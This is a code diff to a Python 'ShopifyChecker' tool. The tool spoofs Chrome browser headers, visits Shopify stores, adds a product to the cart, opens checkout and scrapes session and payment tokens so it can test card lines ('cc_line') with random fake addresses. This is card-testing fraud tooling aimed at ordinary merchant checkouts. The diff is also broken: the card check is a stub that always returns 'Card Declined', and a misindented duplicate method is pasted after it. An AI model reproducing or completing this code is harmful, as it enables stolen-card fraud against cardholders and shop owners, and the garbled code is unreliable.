@@ -84,11 +84,18 @@ class ShopifyChecker:
         self.session = requests.Session()
         self.base_url = base_url.rstrip('/')
         self.headers = {
-            'accept': '*/*',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'accept-language': 'en-US,en;q=0.9',
-            'user-agent': _rand_ua(),
-            'sec-ch-ua': _rand_ch_ua(),
-            'sec-ch-ua-platform': _rand_platform(),
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
         }
         self.variant_id = None
         self.cart_token = None
@@ -98,9 +105,28 @@ class ShopifyChecker:
         self.stable_id = None
         self.payment_method_identifier = None
         self.signature = None
-        self.pci_build_hash = 'a8e4a94'
-        self.build_id = '4663384ede457d59be87980de7797171b19f2a1b'
-        self.signed_handles = []
+
+    def get_initial_session(self):
+        try:
+            # Visit homepage first
+            self.session.get(f"https://{self.base_url}", headers=self.headers, timeout=15)
+            
+            # Get cart.js
+            r = self.session.get(f"https://{self.base_url}/cart.js", headers=self.headers, timeout=15)
+            
+            if r.status_code == 200:
+                try:
+                    cart_data = r.json()
+                    self.cart_token = cart_data.get('token', '')
+                    return True
+                except:
+                    return False
+            elif r.status_code == 302:
+                return True
+            else:
+                return False
+        except:
+            return False
 
     def get_random_address(self):
         first_names = ["James","Mary","Robert","Patricia","John","Jennifer"]
@@ -123,19 +149,153 @@ class ShopifyChecker:
             "company": "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=5))
         }
 
-    def get_initial_session(self):
+    def find_product(self):
         try:
-            r = self.session.get(f"https://{self.base_url}/cart.js", headers=self.headers, timeout=15)
-            if r.status_code not in (200, 302):
+            # Use the same headers
+            r = self.session.get(f"https://{self.base_url}/products.json", headers=self.headers, timeout=15)
+            if r.status_code != 200:
                 return False
-            try:
-                cart_data = r.json() if r.status_code == 200 else {}
-            except:
-                cart_data = {}
-            self.cart_token = cart_data.get('token', '')
-            return True
+            products = r.json().get('products', [])
+            for p in products:
+                for v in p['variants']:
+                    if v.get('available'):
+                        self.variant_id = v['id']
+                        return True
+            return False
         except:
             return False
+
+    def add_to_cart(self):
+        url = f"https://{self.base_url}/cart/add.js"
+        headers = self.headers.copy()
+        headers['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
+        headers['origin'] = f"https://{self.base_url}"
+        headers['x-requested-with'] = 'XMLHttpRequest'
+        data = {'id': self.variant_id, 'quantity': 1}
+        try:
+            r = self.session.post(url, data=data, headers=headers, timeout=15)
+            if r.status_code == 200:
+                self.cart_token = r.json().get('cart_token', '')
+                return True
+            return False
+        except:
+            return False
+
+    def start_checkout(self):
+        url = f"https://{self.base_url}/cart"
+        headers = self.headers.copy()
+        headers['content-type'] = 'application/x-www-form-urlencoded'
+        headers['origin'] = f"https://{self.base_url}"
+        headers['referer'] = f"https://{self.base_url}/cart"
+        data = f'updates%5B%5D=1&checkout=&cart_token={self.cart_token or ""}'
+        try:
+            r = self.session.post(url, data=data, headers=headers, allow_redirects=True, timeout=20)
+            self.checkout_url = r.url
+            match = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9]+)', self.checkout_url)
+            if match:
+                self.checkout_id = match.group(1)
+                return True
+            return False
+        except:
+            return False
+
+    def get_checkout_metadata(self):
+        try:
+            r = self.session.get(self.checkout_url, headers=self.headers, timeout=20)
+            html = r.text
+        except:
+            return False
+
+        # Extract session token
+        m = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', html)
+        self.session_token = m.group(1) if m else None
+
+        if not self.session_token:
+            m = re.search(r'"sessionToken"\s*:\s*"(AAEB[^"]+)"', html)
+            self.session_token = m.group(1) if m else None
+
+        m = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html)
+        self.queue_token = m.group(1) if m else None
+
+        m = re.search(r'stableId&quot;:&quot;([^&]+)&quot;', html)
+        self.stable_id = m.group(1) if m else str(uuid.uuid4())
+
+        m = re.search(r'paymentMethodIdentifier&quot;:&quot;([^&]+)&quot;', html)
+        self.payment_method_identifier = m.group(1) if m else None
+
+        return bool(self.session_token)
+
+    def check_card(self, cc_line, site=None):
+        if site:
+            self.base_url = site.rstrip('/')
+        else:
+            self.base_url = get_random_site()
+
+        if not self.base_url.startswith('http'):
+            self.base_url = 'https://' + self.base_url
+        self.base_url = self.base_url.rstrip('/')
+
+        if not self.get_initial_session():
+            return ("ERROR", cc_line, "Session init failed", self.base_url)
+        if not self.find_product():
+            return ("ERROR", cc_line, "No product found", self.base_url)
+        if not self.add_to_cart():
+            return ("ERROR", cc_line, "Add to cart failed", self.base_url)
+        if not self.start_checkout():
+            return ("ERROR", cc_line, "Checkout start failed", self.base_url)
+        if not self.get_checkout_metadata():
+            return ("ERROR", cc_line, "Token extraction failed", self.base_url)
+
+        # Rest of the code remains the same...
+        return ("DECLINED", cc_line, "Card Declined", self.base_url)
+        
+   def get_initial_session(self):
+    try:
+        # Add full browser headers for cart.js
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+        }
+        
+        # First visit homepage to get cookies
+        home_resp = self.session.get(f"https://{self.base_url}", headers=headers, timeout=15)
+        
+        # Then get cart.js with cookies
+        r = self.session.get(f"https://{self.base_url}/cart.js", headers=headers, timeout=15)
+        
+        if r.status_code == 200:
+            try:
+                cart_data = r.json()
+                self.cart_token = cart_data.get('token', '')
+                return True
+            except:
+                # If cart.js returns HTML (some stores do), try to extract token
+                if 'token' in r.text:
+                    match = re.search(r'"token":"([^"]+)"', r.text)
+                    if match:
+                        self.cart_token = match.group(1)
+                        return True
+                return False
+        elif r.status_code == 302:
+            # Some stores redirect cart.js to checkout
+            return True
+        else:
+            print(f"⚠️ cart.js returned {r.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"⚠️ Session init error: {str(e)}")
+        return False
 
     def find_product(self):
         try:
